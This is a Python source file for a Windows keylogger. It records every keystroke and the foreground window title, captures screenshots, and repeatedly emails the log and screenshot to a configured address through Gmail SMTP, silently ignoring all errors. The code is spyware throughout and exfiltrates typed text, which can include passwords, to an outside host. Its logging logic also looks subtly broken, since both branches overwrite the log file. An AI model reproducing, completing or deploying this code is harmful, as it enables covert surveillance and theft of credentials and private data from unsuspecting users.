from pynput.keyboard import Listener
from win32gui import GetWindowText, GetForegroundWindow
import smtplib
import time
import os
import threading
import PIL.ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import CONFIG

CURRENT_WINDOW = "Nothing"
DELETEFILE = False


def send_email():
    global DELETEFILE
    time.sleep(3)
    while True:
        try:
            message = MIMEMultipart()
            message['From'] = CONFIG.email
            message['To'] = CONFIG.email
            message['Subject'] = "Keylogger Status"+os.environ['COMPUTERNAME']
            image = PIL.ImageGrab.grab()
            image.save(CONFIG.Image)
            fp = open(CONFIG.Image, 'rb')
            img = MIMEImage(fp.read())
            fp.close()
            img.add_header('Content-Disposition',
                           "attachment; filename= %s" % "image.png")
            message.attach(img)
            attachment = open(CONFIG.File, "rb")
            p = MIMEBase('application', 'octet-stream')
            p.set_payload((attachment).read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition',
                         "attachment; filename= %s" % "log.txt")
            message.attach(p)
            server = smtplib.SMTP('smtp.gmail.com:587')
            server.ehlo()
            server.starttls()
            server.login(CONFIG.email, CONFIG.password)
            server.sendmail(CONFIG.email, CONFIG.email,
                            message.as_string())
            server.quit()
            os.remove(CONFIG.Image)
            DELETEFILE = True
        except:
            pass
        time.sleep(CONFIG.Interval)


def write_to_file(key):
    global DELETEFILE
    global CURRENT_WINDOW
    current = GetWindowText(GetForegroundWindow())
    if(CURRENT_WINDOW != current):
        with open(CONFIG.File, 'a', encoding='utf-8') as f:
            f.write("\n")
            f.write(str(current))
            f.write("\n")
        CURRENT_WINDOW = current
    letter = str(key)
    letter = letter.replace("'", "")
    if(DELETEFILE):
        with open(CONFIG.File, 'w') as f:
            f.write(letter)
        DELETEFILE = False
    else:
        with open(CONFIG.File, 'w') as f:
            f.write(letter)


def main():
    EmailGenerator = threading.Thread(target=send_email)
    EmailGenerator.start()
    with Listener(on_press=write_to_file) as l:
        l.join()
    EmailGenerator.join()


if __name__ == "__main__":
    main()
